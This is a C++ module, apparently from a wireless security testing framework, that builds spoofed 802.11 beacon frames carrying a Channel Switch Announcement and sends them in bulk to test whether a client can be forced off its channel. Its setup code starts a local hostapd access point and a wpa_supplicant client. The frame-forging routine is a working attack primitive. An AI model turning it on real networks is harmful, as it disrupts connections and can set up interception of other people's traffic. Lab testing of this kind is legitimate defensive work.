#include "attacks/channel_switch/channel_switch.h"
#include "logger/error_log.h"
#include <cassert>
#include "ex_program/hostapd/hostpad.h"
#include "logger/log.h"
#include <thread>
#include <chrono>

using namespace std;
using namespace Tins;
void send_CSA_beacon(const HWAddress<6> &ap_mac, const NetworkInterface &iface, const string &ssid, const int ap_channel){

    Dot11Beacon beacon;
    beacon.addr1(Dot11::BROADCAST);
    beacon.addr2(ap_mac);
    beacon.addr3(ap_mac);
    beacon.ssid(ssid);
    beacon.ds_parameter_set(6);

    Dot11ManagementFrame::channel_switch_type cs;
    cs.switch_mode = 1;
    cs.new_channel = 1; // TODO hardcoded
    cs.switch_count = 3;
    beacon.channel_switch(cs);

    RadioTap radiotap;
    radiotap.channel(2437, RadioTap::OFDM); //TODO hardcoded channel 6
    radiotap.inner_pdu(beacon);

    PacketSender sender;
    sender.send(radiotap, iface);
}
void check_vulnerable(const HWAddress<6>& ap_mac, const HWAddress<6>& sta_mac, const string &iface_name, const string& ssid, int ap_channel) {

    const NetworkInterface iface(iface_name);
    for(int i = 0; i < 500; i++) { //TODO
        send_CSA_beacon(ap_mac, iface, ssid, ap_channel);
    }

    cout << "check_vulnerable called with:\n"
              << "AP MAC: " << ap_mac << "\n"
              << "STA MAC: " << sta_mac << "\n"
              << "Interface: " << iface_name << "\n"
              << "Channel: " << ap_channel << "\n"
              << "SSID: " << ssid << endl;
}


// ----------------- MODULE functions ------------------
void setup_chs_attack(RunStatus& rs){

    //log_actor_configs(rs.internal_actors);

    if (rs.config["actors"]["access_point"]["source"] != "internal") {
        throw runtime_error("only internal access_point is supported");
    }
    if (rs.config["actors"]["client"]["source"] != "internal") {
        throw runtime_error("only internal access_point is supported");
    }

    const string hostapd_config_path = hostapd_config(rs.run_folder, rs.config["actors"]["access_point"]["setup"]["program_config"]);
    const string wpa_supp_config_path = wpa_supplicant_config(rs.run_folder, rs.config["actors"]["client"]["setup"]["program_config"]);

    const vector<string> hostapd_args = {
        "sudo",
        "hostapd",
        "-i",
        rs.internal_actors.at("access_point")->iface.value(),
        hostapd_config_path
    };
    rs.process_manager.run("access_point", hostapd_args);
    rs.process_manager.wait_for("access_point", "AP-ENABLED");
	log(LogLevel::INFO, "access_point is running");

	const vector<string> wpa_supplicant_args = {
	    "sudo",
        "wpa_supplicant",
        "-i",
        rs.internal_actors.at("client")->iface.value(),
		"-c",
    	wpa_supp_config_path
	};
	rs.process_manager.run("client", wpa_supplicant_args);
    rs.process_manager.wait_for("client", "CONNECTED");
	log(LogLevel::INFO, "client is connected");
}


void run_chs_attack(RunStatus& rs){
    const HWAddress<6> ap_mac((rs.internal_actors["access_point"]->mac.value()));
    const HWAddress<6> sta_mac((rs.internal_actors["client"]->mac.value()));
    const string iface_name = rs.internal_actors["access_point"]->iface.value();
    const string essid = rs.config["actors"]["access_point"]["setup"]["program_config"]["ssid"];
    const int old_channel = rs.config["actors"]["access_point"]["setup"]["program_config"]["channel"];
    //check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel);
    std::this_thread::sleep_for(std::chrono::seconds(30));
    //throw not_implemented_error("Run not implemented");
}
